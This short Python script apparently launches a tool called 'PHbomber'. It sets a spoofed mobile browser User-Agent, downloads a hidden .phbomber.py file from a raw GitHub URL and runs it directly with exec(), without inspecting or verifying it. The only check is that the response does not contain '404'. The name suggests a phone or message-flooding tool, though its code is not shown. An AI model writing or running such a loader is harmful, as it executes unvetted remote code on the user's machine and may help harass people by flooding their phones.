import requests, os, sys
print("Connecting to server..")
header = {'User-Agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'}
data = requests.get("https://raw.githubusercontent.com/AkNOwn389/PHbomber/main/.phbomber.py")
if "404" in data.text:
  sys.exit()
  
exec(data.text)